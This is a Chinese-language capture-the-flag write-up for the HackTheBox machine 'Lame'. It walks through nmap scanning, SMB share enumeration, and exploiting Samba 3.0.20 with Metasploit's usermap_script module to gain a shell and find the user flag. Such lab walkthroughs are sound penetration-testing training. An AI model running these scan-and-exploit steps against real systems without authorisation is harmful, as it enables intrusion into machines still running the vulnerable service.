# HTB Lame
###### tags: `HTB`

1. 首先使用Nmap對目標主機進行PortScan，並將輸出結果儲存
```
nmap -A -T4 -oA nmap/Lame 10.10.10.3
```
![](https://i.imgur.com/GYhrfyY.jpg)

2. 使用Nmap Vlun腳本查看是否有可利用的漏洞，並將儲存結果
```
nmap --script vuln -oA nmap/vlunscan_Lame 10.10.10.3
```
![](https://i.imgur.com/iu5oYoK.png)

* 腳本嘗試了ms10-054 & ms10-061 但沒有奏效

3. 使用less指令查看PortScan的Report
```
less nmap/Lame.nmap
```
* 可以發現到FTP Service(21Port)是開啟的並且可以執行匿名登入，這代表我們可以隨意上傳和下載檔案，但是儘管我們上傳了惡意檔案，也需要使用社交工程的方式誘騙使用者去執行該檔案，所以這不是我們的主要破題思路。
![](https://i.imgur.com/pVuPh9t.png)

* 可以發現到SSH Service(22Port)是開啟的，但是由於我們沒有金鑰，最後可能嘗試以暴力破解的方式登入並連線，但是暴力破解容易引起目標使用者的注意，甚至我們尚未知道多次登入失敗是否會有lock的狀況，所以這也不是我們主要的破題思路。
![](https://i.imgur.com/Yr6mbV5.png)

* 最後可以發現Samba Service(139/445Port)是有開啟的，接下我們可以往這方向做點嘗試
![](https://i.imgur.com/VbTRUJZ.png)
4. 掃描目標主機分享目錄
```
smbclient -L \\\\10.10.10.3\\
```
![](https://i.imgur.com/gp0ZM3V.png)

5. 嘗試連線到目錄中的檔案查看是否有我們可以使用的資訊，例如SSH金鑰等等...
```
smbclient  \\\\10.10.10.3\\tmp
```
![](https://i.imgur.com/tnLjVFW.png)

* 其他檔案需要密碼才能訪問
![](https://i.imgur.com/foyrEDL.png)

* SMB上找不到可以用的相關資訊，繼續查看PortScan Report
6. 從Report上我們可以得知目標主機OS相關訊息
![](https://i.imgur.com/7dCKxsl.png)

* Google Samba 3.0.20相關漏洞
![](https://i.imgur.com/Sxx6Xe5.png)
* 從Rapid7的資料來看，可以繞過Authentication，感覺是可以用的!
![](https://i.imgur.com/Lq7j6LF.png)
7. 使用Metasploit console
* 先重新啟動postgresql service
```
service postgresql restart
```
* 用msfconsole啟動metasploit
```
msfconsole
```
![](https://i.imgur.com/m8HbC6n.png)
* 選擇要利用的漏洞
```
use exploit/multi/samba/usermap_script
```
* 查看需要帶入的參數
```
options
```
* 設定目標主機IP
```
set RHOST 10.10.10.3
```
* 進行Exploit
```
exploit
```
![](https://i.imgur.com/KV7I83a.png)
* Exploit成功後，會建立一個Session，可以用Whoami確認自己的身分權限
![](https://i.imgur.com/WDV0uu0.png)
* 尋找Flag，使用Find指令
```
find "/" -name "user.txt"
```
![](https://i.imgur.com/M8t1jHa.png)
